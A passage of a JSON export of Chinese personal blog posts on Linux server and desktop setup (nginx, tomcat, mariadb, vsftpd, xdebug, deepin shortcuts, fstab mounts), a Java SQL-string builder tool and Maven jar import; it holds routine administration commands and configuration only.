class=\"hljs-number\">1</span>:<span class=\"hljs-number\">8080</span>;\n         proxy_redirect off;\n            <span class=\"hljs-comment\"># 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span>\n            proxy_set_header  Host  <span class=\"hljs-variable\">$host</span>;\n            proxy_set_header  X-Real-IP  <span class=\"hljs-variable\">$remote_addr</span>;\n            proxy_set_header  X-Forwarded-For  <span class=\"hljs-variable\">$proxy_add_x_forwarded_for</span>;\n    }\n   location ~ .<span class=\"hljs-variable\">*\\</span>.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$\n    {\n            root /web/webapp;\n            <span class=\"hljs-comment\">#expires      12d;</span>\n          proxy_cache first;\n    proxy_cache_valid <span class=\"hljs-number\">200</span> <span class=\"hljs-number\">24</span>h;\n    proxy_cache_valid <span class=\"hljs-number\">302</span> <span class=\"hljs-number\">10</span><span class=\"hljs-keyword\">m</span>;\n    }\n   location ~ ^<span class=\"hljs-regexp\">/(WEB-INF)/</span> {\n            deny all;\n     }</code></pre>\n\n<ul>\n<li>修改tomcat下的server配置文件并指定为默认的访问.路径<strong>/etc/nginx/conf.d/default.conf</strong></li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">Engine</span> <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-value\">\"Catalina\"</span><span class=\"hljs-value\">defaultHost=\"blog.yoqu.org\"\"</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">Host</span> <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-value\">\"blog.yoqu.org\"</span>&nbsp;<span class=\"hljs-attribute\">appBase</span>=<span class=\"hljs-value\">\"/web\"</span> <span class=\"hljs-attribute\">unpackWARs</span>=<span class=\"hljs-value\">\"true\"</span>&nbsp;<span class=\"hljs-attribute\">autoDeploy</span>=<span class=\"hljs-value\">\"true\"</span>&gt;</span>&nbsp;\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">Context</span> <span class=\"hljs-attribute\">path</span>=<span class=\"hljs-value\">\"/\"</span>&nbsp;<span class=\"hljs-attribute\">docBase</span>=<span class=\"hljs-value\">\"webapp\"</span>&nbsp;<span class=\"hljs-attribute\">reloadable</span>=<span class=\"hljs-value\">\"true\"</span>/&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">Host</span>&gt;</span></code></pre>",
			"markdowncontent":"#centos7下搭建tomcat+openjdk+mysql+vsftpd+nginx\n\n##安装openjdk\n```\nyum install java-1.7.0-openjdk* -y  \n```\n**********************\n##安装mysql\n>由于CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替，所以安装mariabd\n\n* 使用yum安装mariadb\n```\nyum install mariadb-server mariadb\n```\n**操作mariadb的命令是：**\n```\nsystemctl start mariadb  #启动MariaDB\nsystemctl stop mariadb  #停止MariaDB\nsystemctl restart mariadb  #重启MariaDB\nsystemctl enable mariadb  #设置开机启动\n```\n* 启动数据库\n```\nsystemctl start mariadb\n```\n>默认账号是root，没有密码，所以直接登陆\n```\nmysql -u root\n```\n* 配置mysql的编码，打开文件/etc/my.cnf,加上下段代码\n```\n[mysql]\ndefault-character-set =utf8\n```\n* 创建一个mysql用户,并设置可以远程访问\n```\ngrant usage on *.* to 'fred'@'localhost' identified by 'fred';//创建用户fred密码ferd\nselect host,user,password from mysql.user where user='fred';//查看记录  \ngrant all privileges on *.* to fred@'%'identified by 'fred';//设置可以远程访问\n```\n\n\n****************\n##安装vsftpd\n\n* 使用yum安装vsftpd\n```\nsudo yum install vsftpd\n```\n* 添加ftp用户\n```\nadduser userftp   //添加用户\npasswd userftp\n```\n* 禁止用户ssh登录，只能ftp访问\n```\nusermod -s /sbin/nologin userftp\n```\n* 配置vsftp \n```\nsudo vi /etc/vsftpd/vstfpd.conf\nanonymous_enable=NO  //关闭匿名访问\nlocal_enable=YES  //只能访问自己的主目录\nlocal_root=/data/doc //设置主目录\nsudo service vsftpd restart //重启\nckconfig vsftpd on //设置开机自启动\n```\n\n***********************\n##安装tomcat\n* 使用get命令下载并解压\n```\nwget http://mirrors.noc.im/apache/tomcat/tomcat-7/v7.0.69/bin/apache-tomcat-7.0.69.zip\nunzip apache-tomcat-7.0.69.zip\n```\n\n******************\n##安装nginx\n* yum安装\n```\nyum -y install nginx\n```\n* 编辑默认配置文件并修改一些参数\n```\n    gzip  on;\n    gzip_min_length 1k;\n    gzip_buffers    4 16k;\n    gzip_http_version 1.0;\n    gzip_comp_level 6;\n    gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml;\n    gzip_vary on;\n    proxy_cache_path /nginx/cache levels=1:2 keys_zone=first:10m inactive=24h max_size=1G; #新建缓存路径与相关属性\n    upstream backend { #建立后端tomcat服务器\n    server 127.0.0.1:8080 weight=1;\n   }\n```\n* 修改默认的nginx配置.文件路径为**/etc/nginx/nginx.conf**\n```\n    listen  80;\n    #return 500;\n    server_name blog.yoqu.org ;\n    index index.html index.htm index.jsp;#设定访问的默认首页地址\n    root  /web/webapp;#设定网站的资源存放路径\n    #charset koi8-r;\n    #access_log  /var/log/nginx/log/host.access.log  main;\n\n    location / {\n        #root  /usr/software/tomcat/webapps/finalcms;\n        #index  index.html index.htm;\n        proxy_pass http://127.0.0.1:8080;\n         proxy_redirect off;\n            # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP\n            proxy_set_header  Host  $host;\n            proxy_set_header  X-Real-IP  $remote_addr;\n            proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;\n    }\n   location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$\n    {\n            root /web/webapp;\n            #expires      12d;\n          proxy_cache first;\n    proxy_cache_valid 200 24h;\n    proxy_cache_valid 302 10m;\n    }\n   location ~ ^/(WEB-INF)/ {\n            deny all;\n     }\n```\n* 修改tomcat下的server配置文件并指定为默认的访问.路径**/etc/nginx/conf.d/default.conf**\n```\n<Engine name=\"Catalina\"defaultHost=\"blog.yoqu.org\"\">\n<Host name=\"blog.yoqu.org\" appBase=\"/web\" unpackWARs=\"true\" autoDeploy=\"true\"> \n<Context path=\"/\" docBase=\"webapp\" reloadable=\"true\"/>\n</Host>\n```",
			"tags":"",
			"id":"51437437",
			"categories":"linux,java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年03月01日 13:41:48",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"学习laravel过程中，我需要开启xdebug进行调试，然后xdebug官网看了下说明，linux系统下需要编译安装，配置php.ini \n  官网地址：xdebug\n具体过程：\n下载官方源码包\n解压并进入目录进行编译\n将编译好的文件放入php的扩展中（也可以不用放）\n在php.ini文件中添加扩展\n用到的一些命令解压: tar -zxvf xdebug-2.4.0rc4.tgz编译phpize",
			"title":"linux 安装php扩展记录",
			"type":"original",
			"content":"<blockquote>\n  <p>学习laravel过程中，我需要开启xdebug进行调试，然后xdebug官网看了下说明，linux系统下需要编译安装，配置php.ini <br>\n  官网地址：<a href=\"https://xdebug.org/download.php\">xdebug</a></p>\n</blockquote>\n\n<h3 id=\"具体过程\">具体过程：</h3>\n\n<ul>\n<li>下载官方源码包</li>\n<li>解压并进入目录进行编译</li>\n<li>将编译好的文件放入php的扩展中（也可以不用放）</li>\n<li>在php.ini文件中添加扩展</li>\n</ul>\n\n\n\n<h2 id=\"用到的一些命令\">用到的一些命令</h2>\n\n<p><strong>解压:</strong></p>\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\"> tar -zxvf xdebug-<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.0</span>rc4<span class=\"hljs-preprocessor\">.tgz</span></code></pre>\n\n<p><strong>编译</strong></p>\n\n<pre class=\"prettyprint\"><code class=\" hljs go\">phpize\n./configure\n<span class=\"hljs-built_in\">make</span></code></pre>\n\n<p><strong>复制文件到指定目录</strong></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">cp modules/xdebug<span class=\"hljs-built_in\">.</span>so /opt/lampp/lib/php/extensions/no<span class=\"hljs-attribute\">-debug</span><span class=\"hljs-attribute\">-non</span><span class=\"hljs-attribute\">-zts</span><span class=\"hljs-subst\">-</span><span class=\"hljs-number\">20151012</span></code></pre>\n\n<p>**编辑php.ini文件并加入新的一行</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">vim /opt/lampp/etc/php<span class=\"hljs-built_in\">.</span>ini\n<span class=\"hljs-comment\">//添加下面这一句到文件中</span>\nzend_extension <span class=\"hljs-subst\">=</span> /opt/lampp/lib/php/extensions/no<span class=\"hljs-attribute\">-debug</span><span class=\"hljs-attribute\">-non</span><span class=\"hljs-attribute\">-zts</span><span class=\"hljs-subst\">-</span><span class=\"hljs-number\">20151012</span>/xdebug<span class=\"hljs-built_in\">.</span>so</code></pre>\n\n<h3 id=\"最后一步\">最后一步</h3>\n\n\n\n<h1 id=\"restart-service\">Restart Service</h1>",
			"markdowncontent":">学习laravel过程中，我需要开启xdebug进行调试，然后xdebug官网看了下说明，linux系统下需要编译安装，配置php.ini\n官网地址：[xdebug](https://xdebug.org/download.php)\n###具体过程：\n* 下载官方源码包\n* 解压并进入目录进行编译\n* 将编译好的文件放入php的扩展中（也可以不用放）\n* 在php.ini文件中添加扩展\n\n##用到的一些命令\n**解压:**\n```\n tar -zxvf xdebug-2.4.0rc4.tgz\n```\n**编译**\n```\nphpize\n./configure\nmake\n```\n**复制文件到指定目录**\n```\ncp modules/xdebug.so /opt/lampp/lib/php/extensions/no-debug-non-zts-20151012\n```\n**编辑php.ini文件并加入新的一行\n```\nvim /opt/lampp/etc/php.ini\n//添加下面这一句到文件中\nzend_extension = /opt/lampp/lib/php/extensions/no-debug-non-zts-20151012/xdebug.so\n```\n###最后一步\n#Restart Service",
			"tags":"php,扩展,linux",
			"id":"50771926",
			"categories":"deepin,php",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年03月01日 11:22:54",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"deepin 使用记录\n  最近用linux 的deepin发行版，个人感觉较为符合国人的使用习惯，系统内部集成了QQ聊天工具，以及丰富的应用商店。希望深度团队能将deepin真正的发展起来，支持国产系统！\n1.0 deepin创建快捷方式记录由于deepin自身没有像windows中可以直接对应用程序右键发送快捷方式到桌面，所以我们得自己动手。 \n大概步骤这样： \n* 新建桌面文件 \n* 编辑文件",
			"title":"deepin 使用记录",
			"type":"original",
			"content":"<h1 id=\"deepin-使用记录\">deepin 使用记录</h1>\n\n<blockquote>\n  <p>最近用linux 的deepin发行版，个人感觉较为符合国人的使用习惯，系统内部集成了QQ聊天工具，以及丰富的应用商店。希望深度团队能将deepin真正的发展起来，支持国产系统！</p>\n</blockquote>\n\n<hr>\n\n\n\n<h2 id=\"10-deepin创建快捷方式记录\">1.0 deepin创建快捷方式记录</h2>\n\n<p>由于deepin自身没有像windows中可以直接对应用程序右键发送快捷方式到桌面，所以我们得自己动手。 <br>\n大概步骤这样： <br>\n* 新建桌面文件 <br>\n* 编辑文件 <br>\n* 修改权限为可执行的 <br>\n* 双击应用</p>\n\n<hr>\n\n<blockquote>\n  <p>以Eclipse的快捷方式为例：</p>\n</blockquote>\n\n\n\n<h3 id=\"桌面新建文件\">桌面新建文件</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">touch eclipse<span class=\"hljs-preprocessor\">.desktop</span></code></pre>\n\n\n\n<h3 id=\"编辑文件文件写入内容\">编辑文件，文件写入内容</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs ini\"><span class=\"hljs-title\">[Desktop Entry]</span>\n<span class=\"hljs-setting\">Type=<span class=\"hljs-value\">Application</span></span>\n<span class=\"hljs-setting\">Name=<span class=\"hljs-value\">Eclipse</span></span>\n<span class=\"hljs-setting\">Comment=<span class=\"hljs-value\">My  eclipse</span></span>\n<span class=\"hljs-setting\">Exec=<span class=\"hljs-value\">/media/yoqu/新加卷<span class=\"hljs-number\">1</span>/linuxsoftware/eclipse/eclipse %F</span></span>\n<span class=\"hljs-setting\">Icon=<span class=\"hljs-value\">/media/yoqu/新加卷<span class=\"hljs-number\">1</span>/linuxsoftware/eclipse/icon.bmp</span></span>\n<span class=\"hljs-setting\">Categories=<span class=\"hljs-value\">Development</span></span>\n<span class=\"hljs-setting\">Comment[zh_CN]=<span class=\"hljs-value\"><span class=\"hljs-keyword\">no</span></span></span></code></pre>\n\n\n\n<h3 id=\"保存文件并退出\">保存文件并退出</h3>\n\n\n\n<h3 id=\"双击打开程序即可\">双击打开程序即可</h3>\n\n<hr>\n\n<blockquote>\n  <p>注意：如果你的应用需要管理员权限，需要在exec中前面添加一个gksu来获取管理员权限执行应用，例如</p>\n</blockquote>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs ruby\"><span class=\"hljs-constant\">Exec</span>=<span class=\"hljs-regexp\">/media/yoqu</span><span class=\"hljs-regexp\">/新加卷1/linuxsoftware</span><span class=\"hljs-regexp\">/eclipse/eclipse</span> %<span class=\"hljs-constant\">F</span></code></pre>",
			"markdowncontent":"#deepin 使用记录\n>最近用linux 的deepin发行版，个人感觉较为符合国人的使用习惯，系统内部集成了QQ聊天工具，以及丰富的应用商店。希望深度团队能将deepin真正的发展起来，支持国产系统！\n\n***\n##1.0 deepin创建快捷方式记录\n由于deepin自身没有像windows中可以直接对应用程序右键发送快捷方式到桌面，所以我们得自己动手。\n大概步骤这样：\n* 新建桌面文件\n* 编辑文件\n* 修改权限为可执行的\n* 双击应用\n***\n>以Eclipse的快捷方式为例：\n###桌面新建文件\n```\ntouch eclipse.desktop\n```\n\n###编辑文件，文件写入内容\n\n```\n[Desktop Entry]\nType=Application\nName=Eclipse\nComment=My  eclipse\nExec=/media/yoqu/新加卷1/linuxsoftware/eclipse/eclipse %F\nIcon=/media/yoqu/新加卷1/linuxsoftware/eclipse/icon.bmp\nCategories=Development\nComment[zh_CN]=no\n```\n###保存文件并退出\n###双击打开程序即可\n***\n>注意：如果你的应用需要管理员权限，需要在exec中前面添加一个gksu来获取管理员权限执行应用，例如\n```\nExec=/media/yoqu/新加卷1/linuxsoftware/eclipse/eclipse %F\n```",
			"tags":"deepin,linux,gui",
			"id":"50771184",
			"categories":"deepin",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年01月05日 10:03:17",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"1.sudo blkid 输入该命令查看系统中的分区信息，例如我的：\r\n \r\n2.输入df -h命令查看已挂载的\r\n \r\n3.配置fstab文件 sudo gedit /etc/fstab\r\n文件内容：\r\n\r\n#                \n/deepin/disks/root.disk /               ext4    loop,errors=remount-ro 0     ",
			"title":"deepin开机挂载ntfs分区和ext4分区教程",
			"type":"original",
			"content":"\r\n<p>1.sudo&nbsp;blkid&nbsp;输入该命令查看系统中的分区信息，例如我的：</p>\r\n<p>&nbsp;<img src=\"http://img.blog.csdn.net/20160105095908307?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\" alt=\"\"></p>\r\n<p>2.输入<span style=\"font-family:DejaVu Sans\">df&nbsp;-h</span><span style=\"font-family:方正书宋_GBK\">命令查看已挂载的</span></p>\r\n<p>&nbsp;<img src=\"http://img.blog.csdn.net/20160105095940721?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\" alt=\"\"></p>\r\n<p>3.配置<span style=\"font-family:DejaVu Sans\">fstab</span><span style=\"font-family:方正书宋_GBK\">文件&nbsp;</span><span style=\"font-family:DejaVu Sans\">sudo&nbsp;gedit&nbsp;/etc/fstab</span></p>\r\n<p>文件内容：</p>\r\n<p></p>\r\n<pre name=\"code\" class=\"plain\"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;\n/deepin/disks/root.disk /               ext4    loop,errors=remount-ro 0       1\n/deepin/disks/swap.disk none            swap    loop,sw         0       0</pre><br>\r\n<br>\r\n<p></p>\r\n<p>&nbsp;</p>\r\n<p>在末行回车添加新的</p>\r\n<p></p>\r\n<pre name=\"code\" class=\"plain\">/dev/sdb9    /media/yoqu/mylinux        ext4    defaults        1       2\n/dev/sdb7    /media/yoqu/sdb7           ntfs    defaults        1        2</pre><br>\r\n<br>\r\n<p></p>\r\n<p>保存并退出</p>\r\n<p>//<span style=\"font-family:方正书宋_GBK\">注：</span><span style=\"font-family:DejaVu Sans\">/media/yoqu/sdb7</span><span style=\"font-family:方正书宋_GBK\">这个目录是用户手动建立的，所以需要</span><span style=\"font-family:DejaVu Sans\">sudo&nbsp;mkdir&nbsp;/media/yoqu/sdb7&nbsp;</span><span style=\"font-family:方正书宋_GBK\">还有</span><span style=\"font-family:DejaVu Sans\">sudo&nbsp;/media/yoqu/mylinux</span></p>\r\n<p>4.使用<span style=\"font-family:DejaVu Sans\">sudo&nbsp;mount&nbsp;-a</span><span style=\"font-family:方正书宋_GBK\">对该配置文件生效。如果有问题会报错，根据问题再修改即可</span></p>\r\n<p>5.到<span style=\"font-family:DejaVu Sans\">/media/yoqu</span><span style=\"font-family:方正书宋_GBK\">目录查看，访问即可</span></p>\r\n<p>&nbsp;<img src=\"http://img.blog.csdn.net/20160105100137470?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\" alt=\"\"></p>\r\n<p>&nbsp;</p>\r\n<p>注：修改之后开机重启系统会自动配置的。</p>\r\n",
			"tags":"ntfs自动挂载,ext4挂载",
			"id":"50460407",
			"categories":"ubuntu,deepin",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年12月10日 10:11:51",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"SqlHandle sqlhandle =new SqlHandle(SqlHandle.OPERATES[2],table);\nsqlhandle.OPERATEFILED(field1, value1);\n\n# SqlHandle\n * mysql语法 sql语句拼接工具简类\n * 使用场景：需要快速书写sql语句时用到，主要使用的是mysql中的sql语法\n * 该版本的select",
			"title":"[SqlHandle] java mysql语法 sql语句拼接工具简类",
			"type":"original",
			"content":"\r\n<pre name=\"code\" class=\"java\">SqlHandle sqlhandle =new SqlHandle(SqlHandle.OPERATES[2],table);\nsqlhandle.OPERATEFILED(field1, value1);\n</pre><br>\r\n# SqlHandle<br>\r\n&nbsp;* mysql语法 sql语句拼接工具简类<br>\r\n&nbsp;* 使用场景：需要快速书写sql语句时用到，主要使用的是mysql中的sql语法<br>\r\n&nbsp;* 该版本的select语句只支持单表查询，不支持多表查询，待更新<br>\r\n&nbsp;* where 语句中关联多个字段默认使用And关键字,暂不可更改，待更新<br>\r\n常量说明:<br>\r\n<pre name=\"code\" class=\"java\">\t/**\n\t * 排序操作符：顺序 &quot;ASC&quot;,&quot;DESC&quot;\n\t */\n\tpublic static final String[] SORTS ={&quot;ASC&quot;,&quot;DESC&quot;};\n\t/**\n\t * 数据库操作符：顺序 &quot;select&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;\n\t */\n\tpublic static final String[] OPERATES={&quot;select&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;};</pre><br>\r\n<br>\r\n#使用示例:<br>\r\n生成 select * from user<br>\r\n<pre name=\"code\" class=\"java\">//默认使用select语句\nSqlHandle sqlhandle =new SqlHandle(&quot;user&quot;);</pre><br>\r\n<br>\r\n生成查询 select field1 as f1,field2 as f2 from user where field1=value order by field1 ASC limit 0,5<br>\r\n<pre name=\"code\" class=\"java\">SqlHandle sqlhandle =new SqlHandle(&quot;user&quot;);\nsqlhandle.FIELD(field,alias).CONDITION(filed1,&quot;=&quot;, value).ORDERBY(SqlHandle.SORTS[0], field1).LIMIT(0,5);\n</pre><br>\r\n<br>\r\n<br>\r\n<p>生成插入 insert table SET field1=value1,field2=value2</p>\r\n<p></p>\r\n<pre name=\"code\" class=\"java\">SqlHandle sqlhandle =new SqlHandle(SqlHandle.OPERATES[1],table);\nsqlhandle.OPERATEFILED(field1, value1).OPERATEFILED(field2, value2);\n</pre><br>\r\n<br>\r\n<p></p>\r\n<br>\r\n生成插入 insert table values(value1,value2)<br>\r\n<br>\r\n<pre name=\"code\" class=\"java\">SqlHandle sqlhandle =new SqlHandle(SqlHandle.OPERATES[1],table);\nsqlhandle.OPERATEFILED(value1).OPERATEFILED(value2)\n</pre><br>\r\n<br>\r\n生成更新 update table set field1=value1 where field1=value1<br>\r\n<br>\r\n<pre name=\"code\" class=\"java\">SqlHandle sqlhandle =new SqlHandle(SqlHandle.OPERATES[2],table);\nsqlhandle.OPERATEFILED(field1, value1);</pre><br>\r\n<br>\r\n生成删除 delete from table where field1=value1<br>\r\n<pre name=\"code\" class=\"java\">SqlHandle sqlhandle =new SqlHandle(SqlHandle.OPERATES[3],table);\nsqlhandle.OPERATEFILED(field1, value1);</pre>\r\n<p><br>\r\n</p>\r\n<p>项目git分享地址:https://github.com/yoqu/SqlHandle</p>\r\n<br>\r\n",
			"tags":"java,工具类,sql,mysql",
			"id":"50245875",
			"categories":"java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年12月05日 16:46:11",
			"articleedittype":1,
			"private":0,
			"channel":"0",
			"description":"Java代码  \r\n\r\n\r\nmvn install:install-file  -DgroupId=包名  -DartifactId=项目名  -Dversion=版本号  -Dpackaging=jar  -Dfile=jar文件所在路径  \r\n\r\n\r\n\r\n\r\n\r\n以pinyin4j-2.5.0为例：\r\n\r\n1、将pinyin4j-2.5.0.jar文件放在“D:\\JAR_LIB”目录下（该目录",
			"title":"MAVEN向本地仓库导入jar包",
			"type":"repost",
			"content":"\r\n<div style=\"padding:0px; margin:0px; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体; font-size:12.5px; line-height:22.5px\">\r\n<div style=\"padding:0px; margin:0px\">\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\">Java代码&nbsp;&nbsp;<a target=\"_blank\" href=\"http://zhy4013.iteye.com/blog/1566779\" rel=\"nofollow\" style=\"padding:0px; margin:0px; color:rgb(255,131,115); outline:0px; font-size:12px\"></a></span></div>\r\n</div>\r\n<ol style=\"padding:0px; margin:10px 20px\">\r\n<li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">mvn&nbsp;install:install-file&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">-DgroupId=包名&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">-DartifactId=项目名&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">-Dversion=版本号&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">-Dpackaging=jar&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">-Dfile=jar文件所在路径&nbsp;&nbsp;</span></span></li></ol>\r\n</div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px\"><br style=\"padding:0px; margin:0px\">\r\n</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px\">以pinyin4j-2.5.0为例：</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12px\">1、将pinyin4j-2.5.0.jar文件放在“D:\\JAR_LIB<span style=\"padding:0px; margin:0px; font-size:14px\">”目录下（该目录任意）</span></span></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12px\">2、执行命令：</span></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px; font-size:12px\">mvn install:install-file &nbsp;-Dfile=D:\\JAR_LIB\\pinyin4j-2.5.0.jar -DgroupId=net.sourceforge.pinyin4j -DartifactId=pinyin4j -Dversion=2.5.0 -Dpackaging=jar &nbsp;-DgeneratePom=true -DcreateChecksum=true</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px; font-size:12px\">这样maven向本地仓库导入&nbsp;pinyin4j-2.5.0.jar&nbsp;包就成功了。</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:8px; margin-bottom:8px; line-height:22.5px; letter-spacing:0.5px; font-size:12.5px; word-wrap:break-word; word-break:break-all; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体\">\r\n<span style=\"padding:0px; margin:0px; font-size:12px\">3.pom.xml文件配置：&nbsp;</span></p>\r\n<div style=\"padding:0px; margin:0px; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体; font-size:12.5px; line-height:22.5px\">\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\">Xml代码&nbsp;&nbsp;<a target=\"_blank\" href=\"http://zhy4013.iteye.com/blog/1566779\" rel=\"nofollow\" style=\"padding:0px; margin:0px; color:rgb(255,131,115); outline:0px; font-size:12px\"></a></span></div>\r\n</div>\r\n<ol style=\"padding:0px; margin:10px 20px; line-height:22.5px; color:rgb(51,51,51); font-family:'Microsoft YaHei',Verdana,sans-serif,宋体; font-size:12.5px\">\r\n<li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\"><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>dependency</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>groupId</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>net.sourceforge.pinyin4j<span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;/</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>groupId</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>artifactId</strong></span><span style=\"padding:0px; margin:0px; 